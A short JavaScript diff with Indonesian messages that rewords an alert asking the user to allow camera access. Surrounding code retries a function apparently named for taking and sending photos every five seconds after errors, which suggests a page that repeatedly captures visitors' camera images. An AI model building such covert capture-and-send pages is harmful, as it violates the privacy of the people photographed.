@@ -99,7 +99,7 @@
           console.log("Error: " + err);
           // Menangani kesalahan pengambilan akses kamera
           if (err.name === 'NotAllowedError') {
-            alert('Untuk melanjutkan, izinkan akses kamera pada peramban Anda.');
+            alert('Untuk melanjutkan, izinkan/Allow akses kamera pada browser Anda.');
           } else {
             // Coba kembali mengambil gambar jika terjadi kesalahan dengan delay 5 detik
             setTimeout(takeAndSendPhoto, 5000);
